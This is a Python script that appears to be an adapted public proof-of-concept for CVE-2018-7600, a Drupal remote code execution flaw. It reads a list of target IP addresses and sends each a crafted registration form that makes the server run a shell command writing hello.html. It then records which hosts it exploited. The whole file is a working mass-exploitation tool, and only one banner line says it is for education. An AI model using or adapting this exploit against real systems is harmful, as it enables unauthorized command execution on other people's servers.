#!/usr/bin/env
import sys
import requests

print ('################################################################')
print ('# Proof-Of-Concept for CVE-2018-7600')
print ('# by Vitalii Rudnykh')
print ('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders')
print ('# https://github.com/a2u/CVE-2018-7600')
print ('################################################################')
print ('Provided only for educational or information purposes\n')

#put ip address in text file in the follwowing format:  xxx.xxx.xxx.xxx): ')
targets=''
targets = raw_input('Enter targets text file: ')
results = raw_input('Enter results text file: ')
endResults = raw_input('Enter end results text file: ')
fResults=None
fEndResults=None

try:

        fResults = open(results, 'w+')
        fEndResults = open(endResults, 'w+')


        with open(targets, "r") as f:
                for line in f:
                        try:
                                addr = 'http://'+line.strip()+ '/'
                                print addr
                                url = addr + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
                                payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo ";-)" | tee hello.html'}

                                r = requests.post(url, data=payload)
                                if r.status_code != 200:
                                        print("Not exploitable")
                                else:
                                        print (addr+'hello.html\n')
                                        fResults.write(addr+'hello.html\n');
                                        rcheck = requests.post(addr+'hello.html')
                                        if rcheck.status_code==200:
                                                fEndResults.write(addr+'hello.html\n')
                        except IOError:
                                print 'io iteration'
                        except:
                                print ('error iteration', sys.exc_info()[0])


        fResults.close();
        fEndResults.close();
except IOError:
        print 'io error'
        fResults.close();
